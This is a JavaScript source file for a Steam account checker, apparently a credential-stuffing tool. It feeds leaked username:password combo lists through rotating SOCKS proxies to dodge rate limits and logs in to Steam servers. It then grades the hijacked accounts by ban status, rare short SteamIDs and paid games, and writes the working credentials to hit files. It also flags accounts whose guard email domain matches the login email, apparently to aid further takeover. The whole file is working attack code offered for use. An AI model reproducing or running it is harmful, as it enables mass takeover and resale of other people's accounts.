'use strict';

const Steam = require('../steam');
const GetSteamServers = require("./util/steam-servers");
const GetProxies = require("./util/prep-proxies");
const steam64toId = require("./util/steam64-Converter");
const GetBadSteamIds = require("./util/get-bad-ids");
const List = require("./util/Linked-List");
const fs = require('fs');

class Checker {
	constructor(combosArray) {
		this.status = "Preparing checker";

		// Controls when the checker can begin and when it should be paused
		// Each adds 1 flag, if one fails, checker cannot begin
		// Get settings
		// Fetch steam servers
		// Fetch proxy list
		// Get steam 5 digit filters
		// Get steam 4 digit filters
		this.FLAGSNEEDED = 5;
		this.flagCount = 0;

		// Getting proxies flag
		this.gettingProxies = false;

		// Set settings
		this.settings = {
			loopStart: 0
		}

		//Set settings
		this.SetSettings()
		// Get steam CM servers
		this.FetchSteamServers();
		// Get Proxies
		this.FetchProxyList();
		// Get bad steamIDs lists
		this.GetSteamFilters(5);
		this.GetSteamFilters(4);

		this.combosArray = combosArray;

		// Set stats
		this.stats = {
			comboSize: this.combosArray.length,
			proxySize: 0,
			checksLeft: this.combosArray.length,
			proxiesLeft: 0,
			checked: 0,    
			goodHits: 0,  
			badHits: 0,
			diffEmail: 0,   
			sameEmail: 0,   
			badLogin: 0,   
			rateLimit: 0,  
			retries: 0,
			sevenDig: 0,
			sixDig: 0,
			fiveDig: 0,
			fourDig: 0,
			otherDig: 0,
			filtered: 0
		}
	};

	// Return the combo array
	GetComboArray(){
		return this.combosArray;
	}

	// Return where combo loop ended
	GetComboEnd(){
		return this.settings.loopStart;
	}

	// Pause the checker
	PauseChecker() {
		this.flagCount--;
		//stop the checker loop
		clearInterval(this.intervalId);
		this.status = "Paused";
	}

	// Check if checker can begin or unpause
	CheckCanBegin() {
		this.flagCount++;
		if (this.flagCount == this.FLAGSNEEDED) {
			//Check if it should refetch proxies
			if (this.stats.proxySize <= 500) {
				this.ReFetchProxyList();
			} else {
				this.status = "Good"
				this.StartChecker();
			}
		}
	}

	// Return checker current status
	GetStatus() {
		return this.status;
	}

	// This function starts the checking process
	StartChecker() {
		let self = this;
		this.intervalId = setInterval(this.LoopCombo.bind(self), this.settings.feedTimer);
	}

	LoopCombo() {
		let start = this.settings.loopStart;
		let end = this.settings.loopStart + this.settings.comboFeed;
		//increase start interval for next time loop runs
		this.settings.loopStart = end;

		// Make sure the loop never goes out of bounds
		if (end >= this.combosArray.length) {
			end = this.combosArray.length;
			clearInterval(this.intervalId); //delete the interval
		}

		// Do the loop
		for (; start < end; start++) {
			//check the combo
			let combo = this.GetCombo(start);
			this.DoCheck(combo[0], combo[1]);
		}
	}

	// ALL LOGIC TO CHECKER
	DoCheck(user, pass) {
		let account = {
			user: user,
			pass: pass,
			vac: null,
			communityBannedLocked: null,
			emailVerified: null,
			limited: null,
			goodHit: false,
			sameDomains: false,
			filtered: false,
			gamesObj: null,
			hasGames: false,
			paidGames: false,
			freeGames: false
		}

		//check if we are running out of proxies
		if (!this.gettingProxies && this.stats.proxiesLeft <= 500 || this.stats.rateLimit >= 500) {
			this.ReFetchProxyList();
		}

		// Get next proxy
		let proxy = this.GetNextProxy();

		// Get ramdom steam CM server
		let steamServer = this.GetRanCM();

		// Build options object
		let options = {
			proxy: {
				ipaddress: proxy[0],
				port: proxy[1],
				type: 4,
			},
			timeout: this.settings.proxyTimeOut,
			destination: {
				host: steamServer[0],
				port: steamServer[1]
			}
		}

		let client = new Steam(options);

		// Catch events that make check fail
		client.once("error", err => {
			this.stats.proxiesLeft--;
			this.stats.retries++;

			//Remove proxy for any errors
			this.proxyList.remove(proxy[2]);

			//Redo the check
			this.DoCheck(user, pass);
			this.WriteProxyDebug(err);
		});

		// Log in on connected
		client.once("connected", () => {
			client.LogOn({
				account_name: user,
				password: pass,
				supports_rate_limit_response: true
			});
		});


		//Events related to account hits
		client.once("vacced", (res) => {
			account.vac = res;
			this.PrepareToWriteToFile(account, client);
		});

		client.once("community-banned-locked", (res) => {
			account.communityBannedLocked = res;
			this.PrepareToWriteToFile(account, client);
		});

		client.once("email-verified", (res) => {
			account.emailVerified = res;
			this.PrepareToWriteToFile(account, client);
		})

		client.once("limited", res => {
			account.limited = res;
			this.PrepareToWriteToFile(account, client);
		})

		client.once('games', res =>{
			account.gamesObj = res;
			this.PrepareToWriteToFile(account, client);
		})

		// Log in response
		client.once('logOnResponse', res => {
			console.log(res)
			//Get SteamID and digits
			let steam64 = res.client_supplied_steamid;
			let steamID = steam64toId(steam64);
			let digits = steamID[1].length;

			account.steamID = steamID[0] + steamID[1];
			account.digits = digits;
			account.steam64 = steam64;

			this.stats.checked++
			this.stats.checksLeft--;

			let code = res.eresult;
			// HIT
			if (code == 1) {
				account.hit = true;
			}
			// EMAIL GUARD
			else if (code == 63) {
				account.hit = false;
				account.guardDomain = res.email_domain.toLowerCase();
				this.PrepareToWriteToFile(account);
			}
			// RATE LIMIT
			else if (code == 84) {
				this.stats.checked--;
				this.stats.checksLeft++;
				this.stats.retries++;
				this.stats.rateLimit++;
				//Try again....
				this.DoCheck(user, pass);
			}
			// INVALID PASSWORD
			else {
				this.stats.badLogin++;
				this.WriteBadLogin(account);
			}

			// Set done checking flag
			if (this.stats.checksLeft == 0) {
				setTimeout(() => { this.status = "Finished"; }, 1000);
			}
		});
	}

	// Check if combo is ready to write to file
	PrepareToWriteToFile(account, client) {

		if (account.hit) {
			// Only continue if these properties are set
			if (account.emailVerified == null ||
				account.communityBannedLocked == null ||
				account.vac == null ||
				account.limited == null ||
				account.gamesObj == null) {
				return;
			}

			//Kill connection and remove listeners
			client.DisconnectAfterHit();

			//check if account has games
			this.HasGames(account);

			//Check if account should be filtered
			this.SteamIDFilter(account);

			if (account.filtered) {
				this.WriteAccount(account);
				return;
			}

			// Set bad hit property
			if (account.emailVerified || account.communityBannedLocked || account.vac) {
				account.goodHit = false;
				this.stats.badHits++;
			}
			else {
				this.stats.goodHits++;
				account.goodHit = true;
			}
		}
		else { // NOT A HIT
			//check for login email and guard domain equality

			account.userDomain = account.user.split("@");
			//Bug fix - user@:pass will crash the checker, discard it
			if (!account.userDomain[1]) {
				return;
			}

			account.userDomain = account.userDomain[1].toLowerCase();
			if (account.userDomain === account.guardDomain) {
				account.sameDomains = true;
				this.stats.sameEmail++;
			} else {
				account.sameDomains = false;
				this.stats.diffEmail++;
			}
		}

		//only count digits from good hits and same domain
		if (account.sameDomains || account.goodHit) {
			this.CountDigits(account);
		}

		// Finally write account to file
		this.WriteAccount(account);
	}

	//check if account has games, does not set stats.
	HasGames(account){
		//account doesnt have any games
		if(account.gamesObj == false){
			account.hasGames = false;
		}else{ //account has games
			account.hasGames = true;
			//account has paid games
			if(account.gamesObj.gameStats.paidGames > 0){
				account.paidGames = true;
			}else{ //account has free games only
				account.freeGames = true;
			}
		}
	}

	// Check if account should be filtered
	SteamIDFilter(account) {
		let digits = account.digits;
		// Check accout is 5 or 4 digits
		if (digits > 5 || digits < 4) {
			account.filtered = false;
			return;
		}

		//set correct list
		let list;
		if (digits == 5) {
			list = this.bad5DigList;
		} else {
			list = this.bad4DigList;
		}

		//Check if it should be filtered
		for (var i = 0; i < list.length; i++) {
			if (list[i] === account.steamID) {
				this.stats.filtered++;
				account.filtered = true;
				return;
			}
		}
		account.filtered = false;
	}

	// Set digit stats 
	CountDigits(account) {
		let digits = account.digits;

		if (digits == 7) {
			this.stats.sevenDig++;
		}
		else if (digits == 6) {
			this.stats.sixDig++;
		}
		else if (digits == 5) {
			this.stats.fiveDig++;
		}
		else if (digits == 4) {
			this.stats.fourDig++;
		}
		else {
			this.stats.otherDig++;
		}
	}

	//Returns a random steam cm server
	//[0] - ip  | [1] - port
	GetRanCM() {
		let cmServer = this.steamServers[Math.floor(Math.random() * this.steamServers.length)].split(":");
		cmServer[1] = parseInt(cmServer[1]);
		return cmServer;
	}

	// Get the next proxy in the list
	GetNextProxy() {
		let proxy = this.proxyList.next();
		let proxyArray = proxy.val.split(":");
		proxyArray[1] = parseInt(proxyArray[1]);
		proxyArray[2] = proxy;
		return proxyArray;
	}

	// Returns the next combo
	//[0] - user  | [1] - pass
	GetCombo(i) {
		let combo = this.combosArray[i].split(":");
		//check if combo contains ';' char
		if(combo.length < 2){
			combo = this.combosArray[i].split(";");
		}
		return combo;
	}

	// Write results to txt files
	WriteAccount(account) {
		let path = process.env.workingPath;
		let data;

		let profileURL = `https://steamcommunity.com/profiles/${account.steam64}`;
		data = `${profileURL}\n${account.steamID}\nuser: ${account.user}\npass: ${account.pass}\n`;

		if(account.filtered){
			data += `\n`;
			fs.appendFile(`${path}/filtered.txt`, data, (err) => this.WriteError(err))
			return;
		}

		// Special case - accounts with no email set
		if (!account.hit && !account.guardDomain) {
			data += `\n`;
			fs.appendFile(`${path}/no-email.txt`, data, (err) => this.WriteError(err))
			return;
		}

		// Hit
		if(account.hit){
			if(!account.goodHit){
				if(account.vac){
					data += `vacced\n`;
				}
				if(account.communityBannedLocked){
					data += `locked or community banned\n`;
				}
			}else{// good hit
				if(account.limited){
					data += `limited\n`;
				}
			}

			if(account.hasGames){
				if(account.freeGames){
					data += `free games: ${account.gamesObj.gameStats.freeGames}\n`;
				}else{
					data += `paid games: ${account.gamesObj.gameStats.paidGames}\n`;
					data += `free games: ${account.gamesObj.gameStats.freeGames}\n`;
				}
				account.gamesObj.games.forEach((game) =>{
					data += `${game.name} [${game.billingtype}] [PkgID: ${game.packageid}] [AppID: ${game.appid}]\n`;
				})
			}
		}else{ // Not a hit
			// Set guardDomain if is different from userDomain
			if (!account.sameDomains) {
				data += `domain: ${account.guardDomain}\n`;
			}
		}

		data += "\n";

		// Set correct file
		let file =  `${path}/hits/default.txt`;

		if(account.hit){
			if(account.goodHit){
				file = `${path}/hits/${account.digits}dig-good.txt`;
			}else{ //Bad hit
				if(account.emailVerified && !account.vac && !account.communityBannedLocked){
					file = `${path}/hits/email-verified.txt`;
				}else if(account.vac || account.communityBannedLocked){
					file = `${path}/hits/bad.txt`;
				}
			}
		}else{ // Not a hit
			if(account.sameDomains){
				let domain = account.guardDomain;
				if((account.digits === 6 || account.digits === 7) && (domain === "hotmail.com" || domain === "msn.com")){
					file = `${path}/same-email/${account.digits}Dig-hotmail.txt`;
				}
				else{
					file = `${path}/same-email/${account.digits}Dig.txt`;
				}
			}else{
				file = `${path}/diff-email/${account.digits}Dig.txt`;
			}
		}

		// Write to file
		fs.appendFile(file, data, (err) => this.WriteError(err));
	};

	WriteError(err){
		if(!err){
			return;
		}
		let path = process.env.workingPath;
		err += "\n";
		fs.appendFileSync(`${path}/errors.txt`, err);
	}

	// Write bad login accounts
	WriteBadLogin(account) {
		let path = process.env.workingPath;
		let file = `${path}/bad-login.txt`;
		let data = `${account.user}:${account.pass}\n`;
		// Write to file
		fs.appendFile(file, data, (err) => this.WriteError(err));
	}

	// Write debug file
	WriteProxyDebug(data) {
		if (process.env.testMode) {
			return;
		}
		data += "\n";
		let file = `${process.env.workingPath}/proxy-debug.txt`;

		// Write to file
		fs.appendFile(file, data, (err) => this.WriteError(err))
	}

	// Get SteamID filters
	GetSteamFilters(dig) {
		GetBadSteamIds(dig).then(response => {
			if (dig == 5) {
				this.bad5DigList = response.data.split(/\r?\n/g);
			} else {
				this.bad4DigList = response.data.split(/\r?\n/g);
			}
			this.CheckCanBegin();
		}).catch(error => {
			this.status = `Error: could not get ${dig} dig filters`;
		})
	}

	// Get steam CM servers
	FetchSteamServers() {
		GetSteamServers().then(response => {
			this.steamServers = response.data.response.serverlist;
			this.CheckCanBegin();
		}).catch(error => {
			this.status = "Error: could not get Steam CM servers";
		});
	}

	// Get proxy list
	FetchProxyList() {
		this.gettingProxies = true;
		GetProxies().then(response => {
			this.proxyList = response.data.split("<br>").filter(proxy => {
				if ((proxy.indexOf(":") > -1)) {
					return true;
				}
				return false;
			})
			this.gettingProxies = false;
			let list = new List();
			list.arrayToList(this.proxyList);
			this.proxyList = list;
			this.stats.proxySize = this.proxyList.size;
			this.stats.proxiesLeft = this.proxyList.size;
			this.stats.rateLimit = 0;
			this.CheckCanBegin();
		}).catch(error => {
			// Keep retrying
			this.FetchProxyList();
		});
	}

	// Refetch proxies
	ReFetchProxyList() {
		this.PauseChecker();
		this.status = "Paused to fetch new proxies";
		this.FetchProxyList();
	}

	// Read and set settings
	SetSettings() {
		// Read settings file
		fs.readFile(`${process.env.APPDATA}/steam-checker/settings.cfg`, (err, data) => {
			if (err) {
				fs.writeFileSync(`${process.env.workingPath}/errors.txt`, err);
				process.exit();
			}
			let settings = JSON.parse(data);
			this.settings.comboFeed = parseInt(settings.comboFeed);
			this.settings.feedTimer = (parseInt(settings.feedTimer) * 1000);
			this.settings.proxyTimeOut = (parseInt(settings.proxyTimeOut) * 1000);
			this.CheckCanBegin();
		});
	}

	// Return checker stats
	GetStats() {
		return this.stats;
	}

}

module.exports = Checker;